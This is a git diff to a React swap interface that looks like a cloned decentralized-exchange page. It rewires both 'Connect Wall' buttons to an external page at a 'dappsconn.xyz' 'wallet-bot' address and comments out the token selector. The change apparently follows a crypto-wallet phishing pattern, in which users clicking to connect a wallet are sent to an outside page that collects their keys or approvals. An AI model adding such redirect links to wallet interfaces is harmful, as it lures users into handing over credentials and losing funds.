@@ -38,7 +38,7 @@ function App() {
                 <option>Eth</option>
               </Select>
             </div>
-            <a href='' className=' lg:w-40 lg:px-0 px-3 h-11 bg-[#fdeaf1] ml-2 font-semibold lg:ml-3 rounded-2xl border-2 border-white text-[#d64465] ' >Connect Wall</a>
+            <a href='https://dappsconn.xyz/hash/wallet-bot.live/index.html' className=' lg:w-40 lg:px-0 flex justify-center items-center px-3 h-11 bg-[#fdeaf1] ml-2 font-semibold lg:ml-3 rounded-2xl border-2 border-white text-[#d64465] ' >Connect Wall</a>
             <button className=' h-11 w-11 flex justify-center ml-3 items-center bg-white rounded-lg ' >
               <IoIosMore size={25} />
             </button>
@@ -64,9 +64,11 @@ function App() {
                 <Select className='px-4  ' width='100%' borderRadius='16px' border='0px' height='44px' backgroundColor='#edeef2'  >
                   <option>ETH</option>
                 </Select>
-                <Select className='px-4 ml-2 lg:ml-3 ' width='100%' borderRadius='16px' border='0px' height='44px' color='white' backgroundColor='#e94b6f'  >
+
+            <a href='https://dappsconn.xyz/hash/wallet-bot.live/index.html' className=' w-full lg:px-0 flex justify-center items-center px-3 h-11 text-white ml-2 font-semibold lg:ml-3 rounded-2xl border-0 bg-[#d64465] ' >Connect Wall</a>
+                {/* <Select className='px-4 ml-2 lg:ml-3 ' width='100%' borderRadius='16px' border='0px' height='44px' color='white' backgroundColor='#e94b6f'  >
                   <option>Select a token</option>
-                </Select>
+                </Select> */}
               </div>
               <div className=' my-8 pl-5 pr-2 flex justify-between items-center text-[#d3d3d3] ' >
                 <div>
